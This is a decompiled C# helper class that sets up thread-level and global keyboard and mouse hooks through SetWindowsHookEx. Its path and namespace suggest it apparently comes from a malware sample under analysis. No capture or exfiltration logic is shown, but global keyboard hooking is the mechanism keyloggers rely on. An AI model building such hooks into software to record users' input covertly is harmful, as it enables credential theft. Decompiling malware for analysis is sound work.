// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.MouseKeyHook.WinApi.HookHelper
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using VERMELHO265MONARCA.Core.MouseKeyHook.Implementation;

namespace VERMELHO265MONARCA.Core.MouseKeyHook.WinApi
{
  internal static class HookHelper
  {
    public static HookResult HookAppMouse(Callback callback)
    {
      return HookHelper.HookApp(7, callback);
    }

    public static HookResult HookAppKeyboard(Callback callback)
    {
      return HookHelper.HookApp(2, callback);
    }

    public static HookResult HookGlobalMouse(Callback callback)
    {
      return HookHelper.HookGlobal(14, callback);
    }

    public static HookResult HookGlobalKeyboard(Callback callback)
    {
      return HookHelper.HookGlobal(13, callback);
    }

    private static HookResult HookApp(int hookId, Callback callback)
    {
      HookProcedure hookProcedure = (HookProcedure) ((code, param, lParam) => HookHelper.HookProcedure(code, param, lParam, callback));
      HookProcedureHandle handle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, IntPtr.Zero, ThreadNativeMethods.GetCurrentThreadId());
      if (handle.IsInvalid)
        HookHelper.ThrowLastUnmanagedErrorAsException();
      return new HookResult(handle, hookProcedure);
    }

    private static HookResult HookGlobal(int hookId, Callback callback)
    {
      HookProcedure hookProcedure = (HookProcedure) ((code, param, lParam) => HookHelper.HookProcedure(code, param, lParam, callback));
      HookProcedureHandle handle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, Process.GetCurrentProcess().MainModule.BaseAddress, 0);
      if (handle.IsInvalid)
        HookHelper.ThrowLastUnmanagedErrorAsException();
      return new HookResult(handle, hookProcedure);
    }

    private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam, Callback callback)
    {
      if ((uint) nCode > 0U)
        return HookHelper.CallNextHookEx(nCode, wParam, lParam);
      CallbackData data = new CallbackData(wParam, lParam);
      if (!callback(data))
        return new IntPtr(-1);
      return HookHelper.CallNextHookEx(nCode, wParam, lParam);
    }

    private static IntPtr CallNextHookEx(int nCode, IntPtr wParam, IntPtr lParam)
    {
      return HookNativeMethods.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
    }

    private static void ThrowLastUnmanagedErrorAsException()
    {
      throw new Win32Exception(Marshal.GetLastWin32Error());
    }
  }
}
